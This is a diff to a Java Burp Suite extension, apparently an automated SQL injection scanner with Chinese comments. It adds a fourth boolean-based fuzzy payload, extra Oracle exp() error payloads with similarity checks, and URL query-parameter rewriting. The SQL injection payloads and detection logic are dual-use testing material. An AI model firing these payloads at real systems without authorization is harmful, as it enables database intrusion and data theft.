@@ -13,6 +13,8 @@ import java.io.PrintWriter;
 import java.lang.reflect.Method;
 import java.net.URI;
 import java.net.URISyntaxException;
+import java.net.URLDecoder;
+import java.net.URLEncoder;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -989,7 +991,8 @@ public class BurpExtender implements BurpExtension {
             // 模糊查询注入检测：
             // poc1: value'                  -> 与原始响应长度差异 > 10
             // poc2: value'+or+1=1--+        -> 与原始响应相似度 > 0.90
-            // poc3: value'+or+1=2--+        -> 与原始响应相似度 < 0.90
+            // poc3: value'+or+1=2--+
+            // poc4: value'+or+1=3--+        -> sim(poc2,poc3) < 0.90 且 sim(poc3,poc4) > 0.90
             {
                 String baseBody = resp.bodyToString();
                 int baseLen = baseRespLen;
@@ -1060,13 +1063,36 @@ public class BurpExtender implements BurpExtension {
                             paramEntries.add(poc3Entry);
                             fuzzyEntries.add(poc3Entry);
 
-                            double simPoc2Poc3 = 1.0;
-                            if (poc2Ok && poc3Ok) {
-                                simPoc2Poc3 = textSimilarity(poc2Resp.bodyToString(), poc3Resp.bodyToString());
-                                fuzzyVuln = simPoc2Poc3 < 0.90;
+                            if (sentRequests < MAX_REQUESTS_PER_PARAM) {
+                                String poc4Value = value + "'+or+1=3--+";
+                                HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
+                                long t4 = System.currentTimeMillis();
+                                HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
+                                long cost4 = System.currentTimeMillis() - t4;
+                                sentRequests++;
+                                if (cost4 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                                HttpResponse poc4Resp = poc4Result.response();
+                                boolean poc4Ok = (poc4Resp != null && poc4Resp.statusCode() >= 200 && poc4Resp.statusCode() < 300);
+                                if (poc4Ok && cost4 < quickBaselineCost) quickBaselineCost = cost4;
+
+                                int code4 = poc4Ok ? poc4Resp.statusCode() : 0;
+                                HttpRequestResponse poc4Display = buildDisplayMessage(poc4Req, poc4Result);
+                                LogEntry poc4Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc4Display,
+                                        poc4Req.url().toString(),
+                                        key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
+                                paramEntries.add(poc4Entry);
+                                fuzzyEntries.add(poc4Entry);
+
+                                double simPoc2Poc3 = 1.0;
+                                double simPoc3Poc4 = 0.0;
+                                if (poc2Ok && poc3Ok && poc4Ok) {
+                                    simPoc2Poc3 = textSimilarity(poc2Resp.bodyToString(), poc3Resp.bodyToString());
+                                    simPoc3Poc4 = textSimilarity(poc3Resp.bodyToString(), poc4Resp.bodyToString());
+                                    fuzzyVuln = simPoc2Poc3 < 0.90 && simPoc3Poc4 > 0.90;
+                                }
+                                appendLog(String.format("  模糊查询测试 [%s] sim(poc2,poc3)=%.4f sim(poc3,poc4)=%.4f result=%s",
+                                        key, simPoc2Poc3, simPoc3Poc4, fuzzyVuln));
                             }
-                            appendLog(String.format("  模糊查询测试 [%s] sim(poc2,poc3)=%.4f result=%s",
-                                    key, simPoc2Poc3, fuzzyVuln));
                         }
                     }
                 }
@@ -1098,10 +1124,12 @@ public class BurpExtender implements BurpExtension {
             // 分级检测：快速规则命中后，跳过重型规则(exp/div/sleep)
             boolean fastRuleHit = quoteVuln || numVuln || commaVuln || fuzzyVuln || backtickVuln || errorVuln;
             if (!fastRuleHit && !slowDetected && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                // Oracle exp 检测：'||exp(200)||' / '||exp(11111)||'
-                String[] expPayloads = {"'||exp(200)||'", "'||exp(11111)||'"};
-                int[] expLens = new int[2];
-                for (int ei = 0; ei < 2; ei++) {
+                // Oracle exp 检测：'||exp(200)||' / '||exp(11111)||' / '||exp(2222)||'
+                String[] expPayloads = {"'||exp(200)||'", "'||exp(11111)||'", "'||exp(2222)||'"};
+                int[] expLens = new int[3];
+                HttpResponse[] expResponses = new HttpResponse[3];
+                boolean[] expOkFlags = new boolean[3];
+                for (int ei = 0; ei < 3; ei++) {
                     if (sentRequests >= MAX_REQUESTS_PER_PARAM) {
                         appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止exp payload");
                         break;
@@ -1115,6 +1143,8 @@ public class BurpExtender implements BurpExtension {
                     if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                     HttpResponse expResp = expResult.response();
                     boolean expOk = (expResp != null && expResp.statusCode() >= 200 && expResp.statusCode() < 300);
+                    expResponses[ei] = expResp;
+                    expOkFlags[ei] = expOk;
                     if (expOk && cost < quickBaselineCost) quickBaselineCost = cost;
                     expLens[ei] = expOk ? expResp.body().length() : 0;
                     int code = expOk ? expResp.statusCode() : 0;
@@ -1127,9 +1157,15 @@ public class BurpExtender implements BurpExtension {
                 }
                 boolean eCond1 = Math.abs(expLens[0] - baseRespLen) <= 15;
                 boolean eCond2 = Math.abs(expLens[1] - expLens[0]) >= 15;
-                expVuln = eCond1 && eCond2;
-                appendLog(String.format("  exp测试 [%s] len(base=%d, exp200=%d, exp11111=%d)",
-                        key, baseRespLen, expLens[0], expLens[1]));
+                double simExp2222Exp11111 = 0.0;
+                boolean eCond3 = false;
+                if (expOkFlags[1] && expOkFlags[2]) {
+                    simExp2222Exp11111 = textSimilarity(expResponses[2].bodyToString(), expResponses[1].bodyToString());
+                    eCond3 = simExp2222Exp11111 > 0.90;
+                }
+                expVuln = eCond1 && eCond2 && eCond3;
+                appendLog(String.format("  exp测试 [%s] len(base=%d, exp200=%d, exp11111=%d, exp2222=%d) sim(exp2222,exp11111)=%.4f",
+                        key, baseRespLen, expLens[0], expLens[1], expLens[2], simExp2222Exp11111));
 
                 // 除零检测：'||1/0||' / '||1/1||'
                 String[] divPayloads = {"'||1/0||'", "'||1/1||'"};
@@ -1549,6 +1585,10 @@ public class BurpExtender implements BurpExtension {
         }
 
         HttpParameterType type = target.paramType;
+        if (type == HttpParameterType.URL) {
+            HttpRequest urlReq = buildUrlParamRequest(req, target.name, newValue);
+            if (urlReq != req) return urlReq;
+        }
         boolean jsonLike = (type == HttpParameterType.JSON || isJsonBody(req));
         boolean xmlLike = isXmlBody(req);
 
@@ -1571,6 +1611,41 @@ public class BurpExtender implements BurpExtension {
         }
 
         return req.withUpdatedParameters(HttpParameter.parameter(target.name, newValue, type));
+    }
+
+    private HttpRequest buildUrlParamRequest(HttpRequest req, String paramName, String newValue) {
+        try {
+            URI uri = URI.create(req.url().toString());
+            String rawQuery = uri.getRawQuery();
+            if (rawQuery == null || rawQuery.isEmpty()) return req;
+
+            String[] parts = rawQuery.split("&", -1);
+            boolean replaced = false;
+            for (int i = 0; i < parts.length; i++) {
+                String item = parts[i];
+                int eq = item.indexOf('=');
+                String rawKey = eq >= 0 ? item.substring(0, eq) : item;
+                String key = urlDecode(rawKey);
+                if (!paramName.equals(key)) continue;
+
+                String encodedValue = urlEncodeQueryValue(newValue);
+                parts[i] = rawKey + "=" + encodedValue;
+                replaced = true;
+                break;
+            }
+            if (!replaced) return req;
+
+            StringBuilder newUrl = new StringBuilder();
+            newUrl.append(uri.getScheme()).append("://").append(uri.getRawAuthority());
+            newUrl.append(uri.getRawPath() == null ? "/" : uri.getRawPath());
+            newUrl.append('?').append(String.join("&", parts));
+            if (uri.getRawFragment() != null && !uri.getRawFragment().isEmpty()) {
+                newUrl.append('#').append(uri.getRawFragment());
+            }
+            return applyRequestUrl(req, newUrl.toString());
+        } catch (Exception ignored) {
+            return req;
+        }
     }
 
     private HttpRequest updateHeaderValue(HttpRequest req, String headerName, String newValue) {
@@ -1665,6 +1740,22 @@ public class BurpExtender implements BurpExtension {
             return uri.getRawPath();
         } catch (Exception ignored) {
             return "/";
+        }
+    }
+
+    private String urlEncodeQueryValue(String value) {
+        try {
+            return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
+        } catch (Exception ignored) {
+            return value;
+        }
+    }
+
+    private String urlDecode(String value) {
+        try {
+            return URLDecoder.decode(value, StandardCharsets.UTF_8);
+        } catch (Exception ignored) {
+            return value;
         }
     }
 
